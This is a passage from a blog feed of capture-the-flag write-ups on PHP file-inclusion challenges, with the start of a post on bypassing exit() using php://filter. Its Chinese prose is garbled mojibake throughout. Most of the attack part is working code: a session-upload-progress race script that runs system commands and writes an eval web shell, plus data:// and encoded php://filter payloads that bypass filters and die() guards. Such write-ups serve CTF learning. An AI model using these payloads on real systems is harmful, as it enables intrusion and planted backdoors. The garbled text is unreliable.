è¿™æ—¶å°±å®Œæˆäº†åˆå§‹åŒ–ï¼Œå¹¶å†™å…¥ ini.get (â€œsession.upload_progress.prefixâ€)+ ç”±æˆ‘ä»¬æ„é€ çš„ session.upload_progress.name å€¼ï¼Œä½†æ˜¯ session.upload_progress.cleanup = on ä¼šæ¸…ç©ºæ–‡ä»¶å†…å®¹ï¼Œé‚£ä¹ˆè¿™é‡Œå°±éœ€è¦ç”¨åˆ°æ¡ä»¶ç«äº‰çš„æ€æƒ³äº†ï¼Œåˆ›å»ºè¡¨å•ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶</p>\n<p><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://4ac09838-e15e-4a7d-b82e-1a154d432e4d.challenge.ctf.show/<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>POST<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">enctype</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>multipart/form-data<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>PHP_SESSION_UPLOAD_PROGRESS<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span> &lt;?php system('ls'); ?><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105011223887.png\" alt=\"image-20221105011223887\" /></p>\n<p>ä¸æ–­çš„ä¸Šä¼ ï¼Œä¸æ–­è®¿é—®</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105011144408.png\" alt=\"image-20221105011144408\" /></p>\n<p>åŒç†ï¼Œçœ‹ flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105011323661.png\" alt=\"image-20221105011323661\" /></p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> io\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> threading\n\nsessid <span class=\"token operator\">=</span> <span class=\"token string\">'Qftm'</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">POST</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        f <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>BytesIO<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">1024</span> <span class=\"token operator\">*</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span>\n        session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>\n            <span class=\"token string\">'http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/'</span><span class=\"token punctuation\">,</span>\n            data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"PHP_SESSION_UPLOAD_PROGRESS\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?>');?>\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n            files<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">(</span><span class=\"token string\">'q.txt'</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n            cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span>sessid<span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">READ</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        response <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>sessid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">'flag'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+++]retry'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n            sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">with</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> session<span class=\"token punctuation\">:</span>\n    t1 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>POST<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    t1<span class=\"token punctuation\">.</span>daemon <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\n    t1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    READ<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿™é‡Œé™„ä¸Šå¤§ä½¬çš„è„šæœ¬ï¼Œå¯ä»¥æ¢­å“ˆ</p>\n<h2 id=\"web83\"><a class=\"anchor\" href=\"#web83\">#</a> web83</h2>\n<p>æºç æ²¡å˜ï¼Œä½†æ˜¯å¤šäº†ä¸€æ¡æŠ¥é”™ï¼Œè¿™é‡Œæ˜¯å› ä¸ºæ²¡æœ‰å¼€å¯ sessionï¼ŒåŠ ä¸Š session_start () å³å¯</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105011550544.png\" alt=\"image-20221105011550544\" /></p>\n<p><pre class=\"line-numbers language-php+html\" data-language=\"php+html\"><code class=\"language-php+html\">&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;4ac09838-e15e-4a7d-b82e-1a154d432e4d.challenge.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;\n    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot; &lt;?php system(&#39;ls&#39;); ?&gt;&quot; &#x2F;&gt;\n    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;\n&lt;&#x2F;form&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&lt;?php session_start(); ?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"web87\"><a class=\"anchor\" href=\"#web87\">#</a> web87</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php die('å¤§ä½¬åˆ«ç§€äº†');?>\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>çœ‹åˆ° filter å’Œ die å°±æ„Ÿè§‰ä¸ç®€å•ï¼Œè¿™ä¸å°±æ˜¯æ­»äº¡ dieï¼Œç”¨ php://filter å³å¯ï¼Œå¯ä»¥å»çœ‹ä¸€ä¸‹æˆ‘çš„<a href=\"https://blog.xcu.icu/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/\"> php://filter è¿‡ exit - Web | Clown ã® Blog = (xcu.icu)</a> è¿™ç¯‡æ–‡ç« ï¼Œè¿™é‡Œ url è¦è¿›è¡Œä¸¤æ¬¡ç¼–ç </p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30\ncontent&#x3D;AAPD9waHAgc3lzdGVtKCdscycpOyA&#x2F;Pg&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105012857882.png\" alt=\"image-20221105012857882\" /></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">content&#x3D;AAPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105012936593.png\" alt=\"image-20221105012936593\" /></p>\n<h2 id=\"web88\"><a class=\"anchor\" href=\"#web88\">#</a> web88</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>emmm è¿™é¢˜ï¼Œæ‰€å®è¯å˜çš„æœ‰ç‚¹çªç„¶ï¼Œdata æµè§£å†³</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;input;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105013418162.png\" alt=\"image-20221105013418162\" /></p>\n<h2 id=\"web117\"><a class=\"anchor\" href=\"#web117\">#</a> web117</h2>\n<p>web116 æœ‰äº›ç¦»è°±ï¼Œæˆ‘æ²¡è®°å½•ï¼Œmisc-web666</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'too young too simple sometimes naive!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'contents'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php die();?>\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$contents</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>æ­£åˆ™æ‰äº†å¾ˆå¤šè¿‡æ»¤å™¨ï¼Œå¯ä»¥é€‰æ‹©æ²¡æœ‰è¿‡æ»¤çš„ï¼Œç»•æ­»äº¡å‡½æ•°çš„åŸç†éƒ½æ˜¯ä¸€æ ·çš„</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105014312695.png\" alt=\"image-20221105014312695\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221105014255452.png\" alt=\"image-20221105014255452\" /></p>\n",
            "tags": [
                "CTFshow",
                "æ–‡ä»¶åŒ…å«"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/",
            "url": "https://blog.xcu.icu/2022/11/05/phpfilter%E7%9A%84%E7%BB%95exit/",
            "title": "php://filterè¿‡exit",
            "date_published": "2022-11-04T16:00:00.000Z",
            "content_html": "<h2 id=\"å‰è¨€\"><a class=\"anchor\" href=\"#å‰è¨€\">#</a> å‰è¨€</h2>\n<p>è°¨ä»¥æ­¤ç¯‡è®°å½•ä¸€ä¸‹ php://filter åœ¨ä¸€äº›æƒ…å†µä¸‹çš„ä½¿ç”¨æ–¹æ³•ï¼Œä¸»è¦æ˜¯ php://filter åœ¨ file_put_content å†™æ–‡ä»¶æ—¶çš„ä¸€äº›æ–¹æ³•ï¼Œçœ‹åˆ°ç½‘ä¸Šæœ‰å¾ˆå¤šå¸ˆå‚…éƒ½æœ‰å¯¹è¿™ä¸€å—çš„æ–‡ç« ï¼Œè¿™é‡Œåšä¸€ä¸‹è®°å½•å’Œæµ‹è¯•</p>\n<h2 id=\"ä»€ä¹ˆæ˜¯phpfilter\"><a class=\"anchor\" href=\"#ä»€ä¹ˆæ˜¯phpfilter\">#</a> ä»€ä¹ˆæ˜¯ php://filter</h2>\n<p>é¦–å…ˆæ¥çœ‹çœ‹å®˜æ–¹æ–‡æ¡£ä¸­æ€ä¹ˆè§£é‡Šè¿™ä¸ªä¼ªåè®®</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">php:&#x2F;&#x2F;filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€ file() å’Œ file_get_contents()ï¼Œ åœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104201231469.png\" alt=\"image-20221104201231469\" /></p>\n<p>è¯´ç™½äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªä¼ªåè®®æ¥è¯»å†™æ–‡ä»¶ï¼Œè¿™ä¹Ÿå’Œæœ¬ç¯‡è¦è®°å½•çš„ä½¿ç”¨æ–¹æ³•æ¯æ¯ç›¸å…³</p>\n<h2 id=\"åˆ©ç”¨åœºæ™¯\"><a class=\"anchor\" href=\"#åˆ©ç”¨åœºæ™¯\">#</a> åˆ©ç”¨åœºæ™¯</h2>\n<h3 id=\"é…åˆincludeè¯»å–æ–‡ä»¶\"><a class=\"anchor\" href=\"#é…åˆincludeè¯»å–æ–‡ä»¶\">#</a> é…åˆ include è¯»å–æ–‡ä»¶</h3>\n<p>æ–‡ä»¶åŒ…å«å’Œ xxe ä¸­ä¼šå¸¸è§åˆ°å®ƒçš„èº«å½±ï¼Œæœ¬ç¯‡ä¸»è¦å¯¹æ–‡ä»¶åŒ…å«è¿›è¡Œæµ‹è¯•å’Œè®°å½•</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n//?file=php://filter/read=convert.base64-encode/resource=index.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104202523263.png\" alt=\"image-20221104202523263\" /></p>\n<p>å¯ä»¥é€šè¿‡ä¼ªåè®®æ¥è¯»å–æ–‡ä»¶</p>\n<h3 id=\"ç»•è¿‡file_put_contenä¸­çš„exitdie\"><a class=\"anchor\" href=\"#ç»•è¿‡file_put_contenä¸­çš„exitdie\">#</a> ç»•è¿‡ file_put_conten ä¸­çš„ exit&amp;die</h3>\n<p>å¼€å§‹æœ¬ç¯‡çš„ä¸»è¦éƒ¨åˆ†</p>\n<p>ä¸»è¦åˆ†ä¿©ç§æƒ…å†µ</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">file_put_contents($filename,\"&lt;?php exit();\".$content);\n//file_put_contents($filename,\"&lt;?php die();\".$content);\nfile_put_contents($content,\"&lt;?php exit();\".$content);\n//file_put_contents($content,\"&lt;?php die();\".$content);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>é¦–å…ˆæ¥è¯´ç¬¬ä¸€ç§ï¼Œå°±æ˜¯å†™å…¥æ–‡ä»¶æ—¶ï¼Œdata éƒ¨åˆ†å‰æ‹¼æ¥ä¸Šäº† exit æˆ–è€… die ä½¿å¾—ç¨‹åºæå‰ç»ˆæ­¢ï¼Œå†™å…¥çš„ data ä¸èƒ½æ‰§è¡Œï¼Œå½“ç„¶ç»•è¿‡çš„æ–¹å¼ä¹Ÿä¸éš¾ï¼Œä¸Šé¢å† include çš„åˆ©ç”¨åœºæ™¯ä¸­å¯ä»¥çœ‹åˆ° base64-encode ç¼–ç ï¼Œå½“ç„¶ä¹Ÿæœ‰è§£ç ï¼Œå› ä¸º base64 ç¼–ç å­—ç¬¦æ²¡æœ‰ &lt;?&gt;, ä¹Ÿå°±ä¸èƒ½æ­£å¸¸è¯†åˆ«</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104203735374.png\" alt=\"image-20221104203735374\" 